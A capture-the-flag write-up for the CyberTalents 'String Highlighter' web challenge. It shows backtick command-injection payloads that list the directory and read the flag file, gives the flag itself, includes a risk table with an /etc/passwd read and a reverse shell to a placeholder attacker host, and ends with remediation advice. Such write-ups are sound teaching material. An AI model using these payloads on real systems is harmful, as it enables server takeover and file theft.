# String Highlighter - CyberTalents

---

## Challenge Description
**Flag is hidden somewhere in the directory.**

## Challenge Link
http://cdcamxwl32pue3e6m4m2360mtg301m236mnkmugv0-web.cybertalentslabs.com/

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="710" height="367" alt="image" src="https://github.com/user-attachments/assets/a95813b0-7585-4b72-a7be-686ee33d11b3" />
</p>

<p align="center">
<img width="673" height="367" alt="image" src="https://github.com/user-attachments/assets/3c7ea543-9b75-40e7-86e8-beef2297d041" />
</p>

---

## 2. Challenge Page — String Highlighter

Upon navigating to the challenge URL, a webpage titled **"String Highlighter"** is presented. It contains:

- A text input field with the label **"Type any string to highlight"**
- A colour selector to choose the highlight colour
- A **preview section** that displays the highlighted output of the submitted string in real time

<p align="center">
<img width="921" height="412" alt="image" src="https://github.com/user-attachments/assets/e6f5b2f9-16e7-4f33-a021-ec943de6920d" />
</p>

The description says the flag is **hidden somewhere in the directory** — this strongly hints that we need to execute a server-side command to list and read files on the server.

---

## 3. Testing the Input Field

A simple test string `hye` is submitted. The preview section displays the word **"hye"** highlighted in red — confirming the input is rendered directly into the page output.

<p align="center">
<img width="584" height="258" alt="image" src="https://github.com/user-attachments/assets/103dfb92-d8a5-4c8b-affc-b42e5a82b3d7" />
</p>

---

## 4. Probing for Injection — alert(1) Test

The string `alert(1)` is submitted. The preview displays it literally — the browser does not execute it as JavaScript. This tells us the input is not vulnerable to XSS in this context.

<p align="center">
<img width="638" height="419" alt="image" src="https://github.com/user-attachments/assets/87f7b453-fbdd-40f2-a85c-02f0cc90db0d" />
</p>

---

## 5. Probing for Injection — HTML Tag Test

The string `<html></html>` is submitted. The HTML tags do **not** appear in the preview output — they are swallowed without being rendered or displayed. This behaviour suggests the input may be passing through a server-side processing function rather than being reflected as raw HTML.

<p align="center">
<img width="602" height="416" alt="image" src="https://github.com/user-attachments/assets/4c887294-89a3-4be1-bdea-26948d56869a" />
</p>

This is a key observation — if HTML tags disappear without error, the input may be passing through a shell command on the server side, where HTML has no meaning but shell syntax does.

---

## 6. Testing Command Injection — Listing the Directory

### What is Backtick Command Substitution?

In Linux/Unix shell, backticks `` ` `` are used for **command substitution** — they execute the command inside them and substitute the result in place. So:

```bash
echo `ls -la`
```

Is equivalent to:

```bash
echo $(ls -la)
```

The shell runs `ls -la` first, captures the output, then passes it as the argument to `echo` — which prints it.

### Why Use `echo` With Backticks?

The `echo` command is used as a **wrapper** to force the output of the inner command to be printed as a string. When injecting into a web application:

- The application likely passes the input into a function that processes or highlights the string
- By wrapping the command in backticks inside `echo`, we force the shell to execute `ls -la` and return its output as a plain string
- That plain string then gets passed back through the highlighting function and displayed in the preview

Without `echo`, the backtick substitution might silently execute but never display the output. With `echo`, the output becomes the string being highlighted — making it visible in the preview.

The payload submitted:

```
echo `ls -la`
```

<p align="center">
<img width="727" height="376" alt="image" src="https://github.com/user-attachments/assets/88663a75-a568-4af3-8316-9f4ea9ab52c5" />
</p>

The preview section returns the full directory listing:

```
total 20
drwxr-xr-x 1 root root 4096 Nov 21  2021 .
drwxr-xr-x 1 root root 4096 Sep  1  2020 ..
-rwxrwxr-x 1 root root   11 Apr  1  2021 flag_h@cked_pWn
-rwxrwxr-x 1 root root 4266 Apr  1  2021 index.php
```

### Directory Listing Breakdown

| File | Permissions | Size | Description |
|------|-------------|------|-------------|
| `.` | `drwxr-xr-x` | 4096 | Current directory |
| `..` | `drwxr-xr-x` | 4096 | Parent directory |
| `flag_h@cked_pWn` | `-rwxrwxr-x` | 11 bytes | **The flag file** |
| `index.php` | `-rwxrwxr-x` | 4266 bytes | The web application |

The flag file is named **`flag_h@cked_pWn`** — only 11 bytes in size, consistent with a short flag string.

---

## 7. Reading the Flag File

The same backtick injection technique is used to read the contents of the flag file:

```
echo `cat flag_h@cked_pWn`
```

**How it works:**

| Part | Meaning |
|------|---------|
| `echo` | Forces the output to be printed as a string into the preview |
| `` ` `` | Backticks — command substitution — execute the inner command |
| `cat` | Linux command to read and print the contents of a file |
| `flag_h@cked_pWn` | The flag file name discovered in the directory listing |

<p align="center">
<img width="710" height="367" alt="image" src="https://github.com/user-attachments/assets/1c4f4672-fd1c-4747-b0b3-1eb74feba817" />
</p>

The preview section returns the flag:

> **FLAG: `kshd125fddw`**

---

# OWASP Classification

This vulnerability falls under:

> **OWASP Top 10: A03 — Injection (Command Injection)**

The string input field passed user input directly into a server-side shell command without sanitisation. Backtick command substitution allowed arbitrary OS commands to be executed — listing the directory and reading the flag file.

---

# Why This Is a Security Issue

The application passed the user's input string directly into a shell command on the server without sanitisation:

| Vulnerability | Impact |
|--------------|--------|
| Input passed to shell without sanitisation | Arbitrary OS commands execute on the server |
| Backtick substitution not filtered | Any command wrapped in backticks executes and returns output |
| No output filtering | Server command results displayed directly in the preview |
| Flag file stored in web root | Accessible via `cat` once the filename is known |
| Directory listing possible | `ls -la` reveals all files in the working directory |

### Why Backtick Injection Is Dangerous

| Injection Type | Example | Risk |
|---------------|---------|------|
| Read files | `` echo `cat /etc/passwd` `` | Expose sensitive server files |
| List directories | `` echo `ls -la` `` | Discover hidden files and structure |
| Execute any command | `` echo `whoami` `` | Reveal server user context |
| Reverse shell | `` echo `bash -i >& /dev/tcp/attacker/4444 0>&1` `` | Full server takeover |

---

# Exploitation Flow (OWASP A03 Mapping)

1. Attacker accesses the String Highlighter page
2. Test string `hye` submitted — input reflected in preview, confirms output channel
3. `alert(1)` submitted — not executed as JavaScript, rules out XSS
4. `<html></html>` submitted — tags disappear, suggests server-side shell processing
5. `` echo `ls -la` `` submitted — command substitution executes `ls -la`
6. Directory listing returned in preview — `flag_h@cked_pWn` file discovered
7. `` echo `cat flag_h@cked_pWn` `` submitted — file contents read
8. Flag revealed: **`kshd125fddw`**

---

# Conclusion

This challenge demonstrates **Command Injection via backtick substitution**. The string input field was passed directly into a server-side shell command — allowing backtick-wrapped commands to execute and return their output through the preview display. The directory listing revealed the flag file name, and `cat` read its contents.

To prevent command injection, applications should:

- **Never pass user input to shell commands** — use language-native string functions instead
- **Strip or escape shell metacharacters** — backticks, `$()`, `;`, `|`, `&` must all be neutralised
- Use an **allowlist approach** for input validation — only permit safe characters
- **Store sensitive files outside the web root** — the flag file should not be in the application directory
- Apply the **principle of least privilege** — the web server process should not have permission to read arbitrary files
